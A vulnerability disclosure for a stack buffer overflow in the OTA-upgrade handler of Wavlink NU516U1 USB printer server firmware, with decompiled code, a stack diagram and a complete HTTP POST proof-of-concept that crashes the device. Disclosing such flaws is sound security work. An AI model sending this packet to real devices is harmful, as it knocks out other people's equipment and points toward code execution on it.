# **Stack Buffer Overflow Vulnerability in Wavlink NU516U1 (V251208) adm.cgi Component via "firmware_url" Parameter in sub_406194 Function**

**Overview**

- **Vendor:** Wavlink
- **Product:** NU516U1
- **Version:** WAVLINK-NU516U1-A-WO-20251208-BYFM
- **Type:** Stack Buffer Overflow
- **Product Usage:** USB Printer Server
- **Firmware Download:** https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=all
- **Default Password:** admin

**Vulnerability Basic Information**

- **Vulnerable Function:** `sub_406194` (OTA upgrade handling) and its called helper function `sub_40CCA0` (character escaping).
- **Vulnerability Point:** `strcat(a2, v7)` within the `sub_40CCA0` function.
- **Trigger Parameter:** `firmware_url` (corresponds to `v11` -> `v18` in the code).
- **Prerequisites:**
  - The attacker possesses a valid login Session (Cookie).
  - The `brand`, `model`, and `md5` parameters in the request must contain valid characters to bypass the `sub_40CB5C` blacklist check.

**Vulnerability Description**

When handling OTA firmware upgrade requests, the `sub_406194` function retrieves the user-submitted `firmware_url` parameter and calls the helper function `sub_40CCA0` to process this URL, intending to store the result in a fixed-size buffer `v18` (size 260 bytes) allocated on the stack.

The core of the vulnerability lies in the logic flaw of the helper function `sub_40CCA0`: it iterates through the input string and forcibly adds a backslash `\` before every character for escaping (e.g., input `A` becomes `\A`), causing the data length to expand to twice its original size. Subsequently, the function uses `strcat` to append the expanded data to the target buffer without performing any target buffer boundary checks.

An attacker only needs to send a `firmware_url` exceeding 130 bytes (exceeding 260 bytes after expansion) to cause the `v18` buffer to overflow. The overflowed data will sequentially overwrite local variables on the stack, Saved Registers (s0-s7), and finally overwrite the function's return address (`$ra`). When the function attempts to return, the execution flow will be hijacked, leading to Remote Code Execution (RCE) or Denial of Service (DoS).

**Memory Layout and Cause Analysis**

Based on decompiled code and dynamic debugging results, the memory and logic flow are as follows:

**Stack Layout (`sub_406194`):**

- `v18` (Target Buffer): Located at `$sp + 0x420` (offset may vary slightly due to compiler optimization), size 260 bytes.
- Saved Registers & `$ra`: Located at the high address of the stack frame.

<img width="1587" height="1133" alt="image" src="https://github.com/user-attachments/assets/65d822e7-cbb9-4584-ace2-52e93162b368" />


```
Memory Address
             ▲ (High Address)
             │
+----------------------------+
|    Previous Stack Frame    |  <-- Stack Frame of Caller Function
+----------------------------+
|    Return Address ($ra)    |  🔥 [Overwrite Target] Overflow reaches here to
|                            |      hijack execution flow (PC)
+----------------------------+
|   Saved Registers ($sX)    |  🛡️ Preserved Registers ($s0, $s1... $fp)
|   (Saved FP, $s0-$s7...)   |      (Corrupted first by overflow, causes crash)
+----------------------------+ <--- 💥 v18 Overflow Boundary (approx. offset 0x524)
|                            |
|         Buffer v18         |  🎯 [Vulnerable Buffer] char v18[260]
|        (260 Bytes)         |      Location: [sp + 0x420h]
|                            |
| Fill Direction: Low->High ⬆|
+----------------------------+ <--- v18 Start Address (sp + 0x420)
|                            |
|                            |
|         Buffer v17         |  📄 [Command Buffer] char v17[1024]
|       (1024 Bytes)         |      Location: [sp + 0x20h]
|                            |
|                            |
+----------------------------+ <--- v17 Start Address (sp + 0x20)
|       Padding / Args       |  ☁️ Padding / Reserved Argument Area
+----------------------------+
|     Stack Pointer ($sp)    |  ⚓ Current Top of Stack (Low Address)
+----------------------------+
             │
             ▼ (Low Address)
```

**The Expansion Effect:**

- Input: `AAAAAAAAAA` (10 bytes)
- Memory Write: `\A\A\A\A\A\A\A\A\A\A` (20 bytes, Hex: `5C 41 5C 41 ...`)
- Critical Point: Since the buffer is only 260 bytes, an input of ~130 bytes is enough to fill the buffer.

**Overwrite Path:**

- When the input length reaches 180 bytes (Payload), the actual data written to the stack is 360 bytes.
- These extra 100 bytes are sufficient to cross the boundary of `v18` and completely overwrite the return address `$ra` stored at the bottom of the stack.
- Since the memory content is `\A\A`, the value overwriting `$ra` will exhibit a pattern of `0x5C415C41` (or reversed depending on endianness).

**Vulnerability Code Snippet (Logic Reconstruction)**



```
// Helper function: Vulnerability Amplifier
int __fastcall sub_40CCA0(int a1, const char *a2) // a1: source, a2: dest
{
  // ...
  for ( i = 0; i < strlen(a1); ++i )
  {
    sprintf(v7, "\\%c", *(char *)(a1 + i)); // Force add backslash, length doubles
    strcat(a2, v7); // 💥 Vulnerability Point: Unrestricted append to target buffer
  }
  // ...
}

// Main function: OTA Upgrade
int __fastcall sub_406194(int a1, int n4259840)
{
  char v18[260]; // [sp+420h] Target buffer, only 260 bytes
  // ...
  v8 = sub_40B2F8("firmware_url", a1, 0);
  v11 = strdup(v8);
  // ...
  // Call vulnerability function, write v11 (user input) to v18 (stack) after escaping
  sub_40CCA0(v11, v18); 
  // ...
}
```

**Memory Critical Point Verification (PoC Test)**

According to actual test screenshots (comparison of Content-Length vs. Response Code):

**Safe Payload (Within Critical Limit):**

- Request Body Size: 431 bytes (Payload approx. 170+ 'A's).
- Result: HTTP 200 OK.
- Analysis: The expanded data filled the buffer and overwritten some non-critical registers, but has not yet destroyed the return address `$ra`, or the overwrite value happened not to cause an immediate crash.

<img width="1981" height="875" alt="image" src="https://github.com/user-attachments/assets/cc0ceb8f-63ee-4ae5-a801-587048f73107" />


**Overflow Payload (Trigger Crash):**

- Request Body Size: 432 bytes (Just 1 more 'A').
- Result: HTTP 500 Internal Server Error.
- Analysis: Adding 1 character caused 2 more bytes (`\A`) to be written to the stack. These last 2 bytes became the "straw that broke the camel's back," precisely overwriting the critical bits of `$ra`, causing the function to jump to an illegal address (e.g., `0x....5C41`) upon return, triggering a Segmentation Fault.

<img width="1983" height="925" alt="image" src="https://github.com/user-attachments/assets/143f0b47-0483-4d09-929f-0fec7dec15f4" />


**PoC Packet (Verify Payload)**

To reproduce the crash, send the following data packet (requires a valid cookie):

```
POST /cgi-bin/adm.cgi HTTP/1.1
Host: usblogin.link
Content-Length: 432
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://usblogin.link
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Accept: */*
Referer: http://usblogin.link/html/tools.shtml
Accept-Encoding: gzip, deflate
Cookie: session=2107871459
Connection: close

page=ota_new_upgrade&brand=wavlink&model=123&version=1.0&md5=123456&firmware_url=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

(Note: The number of 'A's in the Payload needs to be sufficient to make the `firmware_url` length exceed 130 bytes; the example above far exceeds this value to ensure a 100% crash trigger).



